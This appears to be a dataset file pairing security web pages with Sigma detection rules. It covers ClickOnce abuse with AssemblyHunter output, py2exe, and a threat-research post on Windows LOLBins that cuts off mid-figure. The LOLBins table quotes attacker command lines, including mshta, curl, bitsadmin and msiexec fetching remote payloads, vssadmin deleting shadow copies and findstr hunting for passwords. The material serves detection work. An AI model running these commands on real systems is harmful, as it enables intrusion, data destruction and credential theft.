60,209 code results\n  \n  Repositories      236\n  Code              60K\n  Commits           5K\n  Issues            4K\n  Discussions       30\n  Packages          2\n  Marketplace       0\n  Topics            5\n  Wikis             197\n  Users             9\n  \n  JosephGaynier/AzureClickOnce\n  Application Files/ClickOnce_1_0_0_4/ClickOnce.dll.manifest\n  <assembly:assembly xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n      xmlns:adaptive=\"http://schemas.microsoft.com/windows/2007/08/xaml\" \n      manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" \n      xmlns:urn=\"urn:schemas-microsoft-com:asm.v2\" \n      xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" \n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n      xmlns:co=\"urn:schemas-microsoft-com:ClickOnce.v1\" \n      xmlns:asm3=\"urn:schemas-microsoft-com:asm.v3\" \n      xmlns:disg=\"http://www.w3.org/2008/09/xmlsig#\" \n      xmlns:co.v2=\"urn:schemas-microsoft-com:clickonce.v2\">\n      <assemblyIdentity name=\"Click Once.exe\" version=\"1.0.0.5\" \n          publicKeyToken=\"00000000000000000000\" language=\"neutral\" \n          processorArchitecture=\"x86\" type=\"win32\"/>\n  </assembly>\n  \n  JosephGaynier/AzureClickOnce\n  Application Files/ClickOnce_1_0_0_2/ClickOnce.dll.manifest\n```\n\nWhile ClickonceHunter will go look through the internet for existing applications, AssemblyHunter will recursively search local file systems for assemblies that meet the criteria for a regular .NET assembly to be deployed as a ClickOnce application.\n\n```image\nAlt: Usage for AssemblyHunter\nDescription: The image depicts a command line interface output for the tool 'AssemblyHunter.exe'. It lists various run type options and their corresponding examples, showing users how to utilize the tool to search for .NET assemblies and related information. Key options include searching paths, files, services, and autoruns, along with optional arguments that allow for more specific queries regarding assembly characteristics and configurations.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe help\n  \n  AssemblyHunter.exe\n  \n  Run Type Options:\n    path        (ex: path=C:\\Users)              full path to search\n    file        (ex: file=C:\\file.exe)           check if a specific file is an assembly\n    collection  (ex: file=C:\\files.txt)          run checks against assemblies listed in a file\n    services    (ex: services=services)          enumerates all services for assemblies\n    tasks       (ex: tasks=tasks)                enumerates all scheduled tasks for assemblies\n    autoruns    (ex: autoruns=autoruns)          enumerates common autorun locations for assemblies\n  \n  Optional args:\n    recurse      (ex: recurse=true)              recurse the path given\n    allPaths     (ex: allPaths=true)             recurses all directories, by default some directories with common Microsoft assemblies are skipped\n    exeonly      (ex: exeonly=true)              look for exes only\n    getarch      (ex: getarch=true)              get assembly architecture\n    servicename  (ex: servicename=true)          check if an exe is a service executable\n    isservice    (ex: isservice=true)            check a specific service (needs services run)\n    getuac      (ex: getuac=true)                gets UAC settings of assembly\n    getrefs      (ex: getrefs=true)              gets references for target assembly\n    getsid       (ex: getsid=true)               gets internal assembly manifest identity\n    getsmid      (ex: getsmid=true)              gets internal application manifest identity\n    getappmanifest (ex: getappmanifest=true)     gets internal application manifest\n    getasmmanifest (ex: getasmmanifest=true)     gets internal assembly manifest\n  \n  * path, file, collection, services, tasks, or autoruns should indicate the type of search performed, all other options narrow down the search\n```\n\n```image\nAlt: AssemblyHunter Discovering .NET Assembly\nDescription: The image displays a command line output from a tool called AssemblyHunter, which is used to identify .NET assemblies in a specific directory. The output lists several found assemblies along with their details, including the assembly manifest identity, version, culture, public key token, and UAC (User Account Control) settings. The highlighted portion indicates that some assemblies lack an application manifest identity, which is crucial for ClickOnce deployment. This content provides valuable technical information relevant to the identification and potential weaponization of .NET applications.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe\n  path=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 exonly=true getsid=true getapid=true getauc=true signed=true\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess32.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess32, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=x86\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInUtil, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: aspnet_compiler, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f711d50a3a, processorArchitecture=AMD64\n      [-] No Application Manifest Identity\n```\n\nUsing AssemblyHunter, we can quickly identify assemblies across a host’s filesystem and look for values that will be useful to us.\n\n```image\nAlt: AssemblyHunter Showing Assemblies that can be Weaponized\nDescription: The image displays a terminal output from running the AssemblyHunter tool, which is used to discover .NET assemblies. The output shows several found assemblies along with their details including paths, certificate issuer names, UAC settings, and assembly manifest identities. Notably, it highlights instances where there is no application manifest identity. This output provides technical information relevant to the identification and potential weaponization of ClickOnce applications.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe\n  path=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 exenoly=true getsid=true getapid=true getuac=true signed=true\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess32.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess32, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=x86\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInUtil, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: aspnet_compiler, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f711d50a3a, processorArchitecture=AMD64\n      [-] No Application Manifest Identity\n```\n\nAssemblyHunter will also show us assemblies that are not useful to us if we would like to see them.\n\n```image\nAlt: Example of anAssembly that Cannot be Weaponized\nDescription: The image displays a terminal or command prompt output that provides detailed information about a found .NET assembly located at 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe'. It includes various attributes such as the certificate issuer name, subject name, UAC setting, assembly manifest identity, and application manifest identity. Key details highlighted in red help identify the assembly's attributes relevant for potential weaponization.\nTranscription: |\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe\n  [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n  [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n  [+] UAC setting: asInvoker\n  [+] Assembly Manifest Identity: caspol, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=AMD64\n  [+] Application Manifest Identity: 1.0.0.0, MyApplication.app\n```\n\n---\n\n## Detection and Prevention Opportunities\n\nA major benefit to defenders who want to identify malicious ClickOnce deployments is that ClickOnce is not commonly used in many corporate environments. Defenders can baseline their environments to look for how prevalent they are and make detection or prevention decisions. Things we would consider looking for when identifying or preventing malicious ClickOnce use is:\n\n> **Monitoring dfsvc.exe process activity**\n\n- Monitoring child process activity (e.g. child processes with unsigned module loads)\n- Baseline required ClickOnce activity to whitelist applications with valid business use-cases\n- Monitoring activity associated with *dfshim.dll* (can also be used for launching ClickOnce deployments)\n\n> Evaluate ETW telemetry associated with ClickOnce deployment execution\n\n- Keep in mind ETW bypasses or *\\<etwEnable\\>* .NET config value\n\n> Baseline the default ClickOnce installation directories\n\n- *%LOCALAPPDATA%\\Apps\\2.0\\<string>*\n\n> Baseline of application that have never been seen making connections to the internet\n\n> Disable all ClickOnce installations from the internet, while still allowing from other trust zones\n\n- Options include: Enabled, AuthenticodeRequired, and Disabled\n- Zones include: MyComputer, LocalIntranet, TrustedSites, Internet, UntrustedSites\n- To disable installation from internet: *\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled*\n\n> If an Application Control solution is deployed\n\n- Prevent unreputable DLLs from being loaded\n\nIf ClickOnce application execution from the internet is disabled using the registry key(s) mentioned above, a user will receive a prompt that does not give them the option to run the application.\n\n```image\nAlt: Prevention of ClickOnce Installation from Internet Trust Zone\nDescription: The image is a screenshot of a security warning dialog box on a computer. It indicates that an application installation has been blocked by the administrator due to potential security risks. The dialog provides the following details: the application name is 'Defcon30 Demo, Inc.', the source URL is 'defcon30.azureedge.net', and the publisher is listed as 'Unknown Publisher'. Additionally, there is a note stating that security settings on the computer prevent the application from being installed.\nTranscription: |\n  Application Install - Security Warning\n  \n  Your administrator has blocked this application because it potentially poses a security risk to your computer.\n  \n  Name:\n  Defcon30 Demo, Inc.\n  \n  From (Hover over the string below to see the full domain):\n  defcon30.azureedge.net\n  \n  Publisher:\n  Unknown Publisher\n  \n  [Close]\n  \n  Your security settings do not allow this application to be installed on your computer.\n```\n\n---\n\n## Closing\n\nBased on all that was covered, we see ClickOnce as one of the best opportunities for initial access. There are still plenty of areas to dig into and additional potential for offensive use-cases.",
    "sigma_rule": {
      "title": "Unsigned Module Loaded by ClickOnce Application",
      "id": "060d5ad4-3153-47bb-8382-43e5e29eda92",
      "status": "test",
      "description": "Detects unsigned module load by ClickOnce application.",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5"
      ],
      "author": "@SerkinValery",
      "date": "2023-06-08",
      "tags": [
        "attack.persistence",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_path": {
          "Image|contains": "\\AppData\\Local\\Apps\\2.0\\"
        },
        "selection_sig_status": [
          {
            "Signed": "false"
          },
          {
            "SignatureStatus": "Expired"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_clickonce_unsigned_module_loaded.yml",
    "id": "47"
  },
  {
    "url": "https://www.py2exe.org/",
    "markdown": "# py2exe\n\npy2exe is a Python Distutils extension which converts Python scripts into executable Windows programs, able to run without requiring a Python installation.\n\nDevelopment is hosted on GitHub. You can find the mailing list, svn, and downloads for Python 2 there. Downloads for Python 3 are on PyPI.\n\npy2exe was originally developed by Thomas Heller who still makes contributions. Jimmy Retzlaff, Mark Hammond, and Alberto Sottile have also made contributions. Code contributions are always welcome from the community and many people provide invaluable help on the mailing list and the Wiki.\n\npy2exe is used by BitTorrent, SpamBayes, and thousands more - py2exe averages over 5,000 downloads per month.\n\nIn an effort to limit Wiki spam, this front page is not editable. Feel free to edit other pages with content relevant to py2exe. You will need an account to edit (but not to read) and your account information will be used only for the purposes of administering this Wiki.\n\nThe old py2exe web site is still available until that information has found its way into this wiki.\n\n## Starting Points\n\n- Download py2exe for Python 2 from SourceForge\n- Download py2exe for Python 3 from PyPI\n- News: information about the most recent releases\n- Tutorial: the basics of creating a Windows executable\n- FAQ: What does py2exe actually do and what are all those files?\n- GeneralTipsAndTricks: general tips for working with special situations\n- WorkingWithVariousPackagesAndModules: many just work, others need more handling\n- ProblemsToBeFixed\n- TroubleshootingImportErrors\n- ReleaseProcess\n- NonEnglish: read about py2exe in other languages\n- Get help on the mailing list\n- #py2exe IRC channel at Freenode.net\n\n## How to use this site\n\nA Wiki is a collaborative site, anyone can contribute and share:\n\n- Edit any page by pressing **Edit** at the top or the bottom of the page\n- Create a link to another page with joined capitalized words (like WikiSandBox) or with `[[words in brackets]]`\n- Search for page titles or text within pages using the search box at the top of any page\n- See HelpForBeginners to get you going, HelpContents for all help pages.\n\nTo learn more about what a WikiWikiWeb is, read about WhyWikiWorks and the WikiNature.\n\nThis wiki is powered by MoinMoin.\n\n---\n\nFrontPage  (last edited 2020-10-27 22:20:58 by albertosottile)",
    "sigma_rule": {
      "title": "Python Image Load By Non-Python Process",
      "id": "cbb56d62-4060-40f7-9466-d8aaf3123f83",
      "status": "test",
      "description": "Detects the image load of \"Python Core\" by a non-Python process. This might be indicative of a Python script bundled with Py2Exe.",
      "references": [
        "https://www.py2exe.org/",
        "https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/"
      ],
      "author": "Patrick St. John, OTR (Open Threat Research)",
      "date": "2020-05-03",
      "modified": "2023-09-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Description": "Python Core"
        },
        "filter_main_generic": [
          {
            "Image|contains": "Python"
          },
          {
            "Image|startswith": [
              "C:\\Program Files\\",
              "C:\\Program Files (x86)\\",
              "C:\\ProgramData\\Anaconda3\\"
            ]
          }
        ],
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate Py2Exe Binaries",
        "Known false positive caused with Python Anaconda"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_python_image_load.yml",
    "id": "48"
  },
  {
    "url": "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter",
    "markdown": "# LOLBins: Understanding the Silent Operations of Attackers\n\n**September 01, 2021**\n\n**Tags:** \nCloud Security, Threats\n\nThe Uptycs Threat Research team has observed several malicious binaries in our threat intelligence systems using LOLBins in their attack kill chain. LOLBins (short form for Living Off the Land Binaries), are non-malicious native operating system or known software binaries used for performing malicious activities and evading cyber defenses.\n\nThe Uptycs Threat research team has created over 300 rules covering different techniques used by LOLBins in the MITRE ATT&CK framework.\n\nIn this post, we’ll take a look at the LOLBins used by the attackers and how you can use Uptycs EDR detection capabilities to find if these have been used in your environment.\n\nClick here to see the LOLBins MITRE map\n\n## LOLBins & Uptycs EDR Coverage\n\nLiving off the Land binaries exploit the trusted utilities for achieving malicious objectives. They are mostly used by threat actors to stay under the radar and continue malicious activities undetected. In Windows, most of the malware families are taking leverage of LOLBins for a wide variety of phases in the attack kill chain.\n\nUptycs EDR has a robust coverage for all LOLBAS (Living off the Land Binaries and Scripts) techniques in the wild. Using the data from our customer telemetry and threat intelligence systems, the Uptycs Threat research team has created over 300 rules covering 8 different tactics used by LOLBins in the MITRE ATT&CK framework. The distribution of these rules with the techniques is shown below (see Figure 1).\n\n```image\nAlt: Figure1\nDescription: The image is a pie chart representing the distribution of rules created by the Uptycs Threat research team covering various tactics used by Living off the Land binaries (LOLBins) according to the MITRE ATT&CK framework. The chart includes segments labeled with different tactics: Defense Evasion (32.6%), Execution (20.8%), Discovery (13.7%), Persistence (10.9%), Credential Access (7.0%), Command and (6.1%), Lateral Movement (3.8%), and Collection (1.6%). Each segment is color-coded and indicates the percentage of rules associated with each tactic.\nTranscription: |\n  Collection: 1.6%\n  Persistence: 10.9%\n  Credential Access: 7.0%\n  Lateral Movement: 3.8%\n  Command and Control: 6.1%\n  Execution: 20.8%\n  Discovery: 13.7%\n  Defense Evasion: 32.6%\n```\n\n## April - July 2021 LOLBins & MITRE ATT&CK Mapping\n\nUsing the data from our in-house threat intelligence systems and customer telemetry, we created a monitoring dashboard of all observed LOLBins. From April 2021 through July 2021, we have observed 26 binaries mostly used as LOLBins by several malware groups. The prevalence of the malicious binaries using the LOLBins is shown below (see Figure 2).\n\n```image\nAlt: Figure2\nDescription: The image is a bar chart that displays the prevalence of various Windows executables identified as LOLBins (Living Off the Land Binaries) used by attackers from April to July 2021. The x-axis lists the executables, while the y-axis shows the count of occurrences. The chart highlights the significant usage of 'regsvr32.exe' and 'rundll32.exe', showing counts of 32,732 and 15,864 respectively, followed by other executables like 'EQNEDT32.exe', 'cmd.exe', and 'powershell.exe' with lower counts. This visual representation serves to illustrate the distribution of these binaries in malicious activities.\nTranscription: |\n  Executables         Count\n  regsvr32.exe        32732\n  rundll32.exe        15864\n  EQNEDT32.EXE        7246\n  cmd.exe             3091\n  powershell.exe      2713\n  atbroker.exe        840\n  wmi.exe             450\n  schtasks.exe        298\n  nash.exe            93\n  chrome.exe          81\n  vssadmin.exe        67\n  net.exe             55\n  msha.exe            48\n  cscript.exe         50\n  curl.exe            35\n  certutil.exe        25\n  wscript.exe         24\n  msiexec.exe         18\n  csc.exe             14\n  reg.exe             4\n  findstr.exe         4\n  bthadmin.exe        4\n  taskkill.exe        4\n  whoami              3\n  tasklist.exe        3\n  verclsid.exe        2\n```\n\nThese LOLBins were identified to be exclusively used in the Defense Evasion and Execution phase of the MITRE ATT&CK framework. The distribution of the different ATT&CK tactics used by the attackers leveraging Windows utilities from April 2021 through July 2021 is shown below (see Figure 3).\n\n```image\nAlt: Figure3\nDescription: The image is a pie chart illustrating the distribution of different MITRE ATT&CK tactics used by attackers leveraging LOLBins from April to July 2021. The chart highlights six tactics: Defense Evasion (34.6%), Execution (26.9%), and others like Discovery, Credential Access, Impact, Command and Control, Persistence, and Privilege Escalation, each accounting for 3.8% to 7.7% of the total. Each segment is color-coded and labeled with corresponding percentages.\nTranscription: |\n  Defense Evasion: 34.6%\n  Execution: 26.9%\n  Discovery: 7.7%\n  Credential Access: 7.7%\n  Impact: 7.7%\n  Command and Control: 7.7%\n  Persistence: 3.8%\n  Privilege Escalation: 3.8%\n```\n\n<a id=\"MITREMapLOLBin\"></a>\n\nThe table below describes these 26 LOLbins, along with their MITRE ATT&CK mapping and a command line example.\n\n| LOLBin         | MITRE ID | MITRE Tactic         | Description                                                                 | Command Line Example                                         |\n| -------------- | -------- | -------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------ |\n| regsvr32.exe   | T1218    | Defense Evasion      | Adversaries may use regsvr32.exe to execute malicious DLLs.                 | `regsvr32 ..\\Kro.fis2`                                       |\n| rundll32.exe   | T1218    | Defense Evasion      | Adversaries may use rundll32.exe to load malicious DLLs.                    | `rundll32 ..\\Kiod.hod2,DllRegisterServer`                    |\n| EQNEDT32.exe   | T1203    | Execution            | Adversaries may exploit CVE-2017-11882 vulnerability in eqnedt32 for RCE.   | `EQNEDT32.EXE -Embedding`                                    |\n| Cmd.exe        | T0159    | Execution            | Adversaries may use cmd.exe to launch other Windows utilities for attacks.  | `cmd.exe /c reg add HKCU\\<Reg Key Path> /d 1q1a1z.bat /f`    |\n| powershell.exe | T1059    | Execution            | Adversaries may use powershell.exe to download payloads or execute scripts. | `PowerShell -c (New-Object System.Net.WebClient)...`         |\n| attrib.exe     | T1564    | Defense Evasion      | Adversaries may use attrib.exe to hide files for defense evasion.           | `\"C:\\Windows\\system32\\attrib.exe\" +h C:\\Users\\admin\\...`     |\n| wmic           | T1047    | Execution            | Adversaries may use wmic for execution or lateral movement.                 | `wmic process call create \"rundll32.exe C:\\ProgramData...`   |\n| schtasks.exe   | T1053    | Privilege Escalation | Adversaries may abuse schtasks.exe to initiate execution of malicious code. | `schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup...`        |\n| netsh          | T1546    | Persistence          | Adversaries may use netsh to gain persistence by executing helper DLL.      | `netsh add helper C:/Users/Public/settingsync.dll`           |\n| Chrome.exe     | T1105    | Command and Control  | Adversaries can spawn chrome.exe to download malicious files.               | `cmd /k start chrome https://onedrive.live.com/embed?...`    |\n| vssadmin.exe   | T1490    | Impact               | Adversaries may use vssadmin.exe to delete volume shadow copies.            | `vssadmin.exe delete shadows /all /quiet`                    |\n| net.exe        | T1562    | Defense Evasion      | Adversaries can use net.exe to stop services on the target system.          | `C:\\Windows\\system32\\net.exe stop \"samss\" /y`                |\n| mshta.exe      | T1218    | Defense Evasion      | Adversaries may abuse mshta.exe to proxy execution of malicious .hta files. | `mshta https://median-researchers.000webhostapp.com/cmd.hta` |\n| cscript.exe    | T1059    | Execution            | Adversaries may use cscript.exe to execute VB Scripts.                      | `\"C:\\Windows\\System32\\cscript.exe\" //NOLOGO \".\\XMCO_Snap...` |\n| curl.exe       | T1105    | Command and Control  | Adversaries may use curl.exe to download tools and payloads.                | `curl.exe -o C:\\ctf\\file.exe https://dforest.watch...`       |\n| certutil.exe   | T1140    | Defense Evasion      | Adversaries may use certutil.exe to encode/decode payloads.                 | `certutil -decode C:\\ProgramData\\googlelog.txt C:\\...`       |\n| wscript.exe    | T1059    | Execution            | Adversaries may use wscript.exe to execute VBA, VBS, JS files.              | `WScript.exe\" \"C:\\Users\\user\\Desktop\\2.vbs\"`                 |\n| msiexec.exe    | T1218    | Defense Evasion      | Adversaries may use msiexec.exe to silently launch malicious MSI files.     | `msiExec /i http://hotelcontinental-khenifra.com/ffp...`     |\n| csc.exe        | T1027    | Defense Evasion      | Adversaries may use csc.exe to compile executables from downloaded C# code. | `\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\...`       |\n| reg.exe        | T1112    | Defense Evasion      | Adversaries may use reg.exe to query, add or modify Windows registry.       | `REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion...` |\n| findstr.exe    | T1552    | Credential Access    | Adversaries may search for unsecured credentials using findstr.exe.         | `findstr /spin \"password\" *.*`                               |\n| bitsadmin.exe  | T1197    | Defense Evasion      | Adversaries may abuse bitsadmin to download malicious code.                 | `bitsadmin.exe /transfer McbDBJxc https://jrsawesome...`     |\n| taskkill.exe   | T1489    | Impact               | Adversaries may use taskkill.exe to kill processes or stop services.        | `taskkill /im explorer.exe /f`                               |\n| whoami.exe     | T1033    | Discovery            | Adversaries may try to find current logged in user using whoami.exe.        | `cmd.exe /c whoami.exe /PRIV > file.txt`                     |\n| tasklist.exe   | T1057    | Discovery            | Adversaries may use tasklist.exe to enumerate running processes.            | `tasklist /nh /fi \"imagename eq svhost.exe\"`                 |\n| verclsid.exe   | T1218    | Execution            | Adversaries may abuse verclsid.exe to execute malicious COM payloads.       | `verclsid.exe /S /C {E88DCCE0-B7B3-11D1-A9F0-00AA...`        |\n\n## LOLBins Observations\n\nBased on the data we obtained from April 2021 through July 2021, we identified the following:\n\n- Most of the LOLBin alerts we have identified have been triggered via decoy macro documents.\n- **regsvr32.exe** and **rundll32.exe** have the highest number of counts as these utilities were used exclusively by Qbot and IcedID malwares from the beginning of January 2021, as detailed in our previous blog.\n- We have also seen a significant number of Loki and Agent Tesla malware samples exploiting a Microsoft Equation Editor (EE) vulnerability in the EQNEDT32.\n\nWe will now cover interesting examples of LOLBins and their corresponding MITRE ATT&CK tactics.\n\n## LOLBin - Chrome.exe\n\n**Tactic: Command & Control** \n*Hash: eae1b54ba4168e16e951fde291520078d8a5f8b98447cedf5663ae62b9069127*\n\nChrome is the most commonly used browser by most users even though it is not a default Windows utility. During June 2021, our threat intelligence systems detected a document “Resume.docx” which spawned a new process of chrome.exe via command line. This activity often goes unnoticed by monitoring solutions.\n\nThe document used chrome.exe to create a new window via command line argument `--new-window` to download the payload from onedrive.com as shown below (see Figure 4).\n\n```image\nAlt: Figure4-1\nDescription: The image is a screenshot of a process monitoring tool displaying a list of processes with details about their creation events. It highlights the processes 'cmd.exe' and 'chrome.exe', showing their Parent Process ID (PID), command line arguments, and the file paths. The command line for 'chrome.exe' includes the argument '--new-window' followed by a URL from onedrive.com, indicating that a document (Resume.docx) was used to execute this process. This visual data is relevant to understanding the manipulation of commonly used applications in cyber attacks.\nTranscription: |\n  WINWORD.EXE       2304   Process Create   C:\\windows\\system32\\cmd.exe\n  cmd.exe           2360   Process Start\n  cmd.exe           2360   Process Create   C:\\Windows\\System32\\Conhost.exe\n  Conhost.exe      11728   Process Start\n  cmd.exe           2360   Process Create   C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe        4436   Process Start\n  chrome.exe        4436   Process Start\n  chrome.exe        7228   Process Start\n  \n  Event Properties\n  \n  Event\n  Date & Time:  23-07-2021 13:14:19.8995677\n  Thread:       10836\n  Class:        Process\n  Operation:    Process Start\n  Result:       SUCCESS\n  Path:         \n  Duration:     0.0000000\n  \n  Parent PID:   2360\n  Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --new-window https://onedrive.live.com/embed?cid=880174EF88F116A9\n```\n\n## LOLBin - Schtasks.exe\n\n**Tactic: Privilege Escalation** \n*Hash: 6c92ed33934d5a604f57aac4ff33252720354285291791bed88b6f3f15b9631d*\n\nSchtasks is used to create scheduled tasks which can be executed from time to time recurrently. We identified a document using schtasks for privilege escalation.\n\nThe Excel document we identified launches schtasks via command line to run the existing task named as SilentCleanup. This action is performed to bypass UAC and execute powershell commands in elevated mode as shown below (see Figure 5).\n\n```image\nAlt: Figure5-1\nDescription: The image displays a series of event logs related to the execution of processes on a Windows operating system. It highlights the execution of 'Excel.exe' and 'schtasks.exe,' with the command line associated with 'schtasks' specifically indicated. The command line shows the execution of a scheduled task named 'SilentCleanup,' which is relevant for privilege escalation techniques discussed in the provided context.\nTranscription: |\n  EXCEL.EXE         6428   Process Create   C:\\Windows\\System32\\cmd.exe\n  cmd.exe            224   Process Start    C:\\Windows\\System32\\Conhost.exe\n  cmd.exe            224   Process Create   C:\\Windows\\system32\\schtasks.exe\n  schtasks.exe      8832   Process Start\n  \n  Event Properties\n  Event    Process    Stack\n  \n  Date:    22-07-2021 14:01:59.8664141\n  Thread:  3456\n  Class:   Process\n  Operation: Process Start\n  Result:  SUCCESS\n  Path:    \n  Duration: 0.0000000\n  \n  Parent PID:   224\n  Command line: schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n  Current directory: C:\\Users\\lambtao\\Documents\\\n  Environment:\n```\n\n## LOLBin - Csc.exe\n\n**Tactic: Defense Evasion** \n*Hash: 2048aae014930d195ac0c139c3260928bd25d840ff924fb46d25c79048a9c813*\n\nCsc.exe is an inbuilt utility located in the Microsoft.NET\\Framework\\<Version> folder under the Windows directory. The main purpose of this utility is to compile C# code. As the malicious code isn't compiled, the adversaries may be able to bypass the detection and analysis as it can also be named as legitimate looking documents.\n\nWe identified a word document named “contract.docm”, which launches powershell to download the uncompiled C# code. After download is complete, csc.exe compiles the same executable code on the fly as shown below (see Figure 6).\n\n```image\nAlt: Figure6\nDescription: The image displays a log of process events related to the execution of the Csc.exe utility. It details multiple process activities, such as the starting and exiting of various processes including WINWORD.EXE and powershell.exe. The highlighted section includes information about the Csc.exe process, including the command line used to execute it, the parent process ID, and the current directory from which it was run. This information is relevant for understanding how attackers can use Csc.exe as a 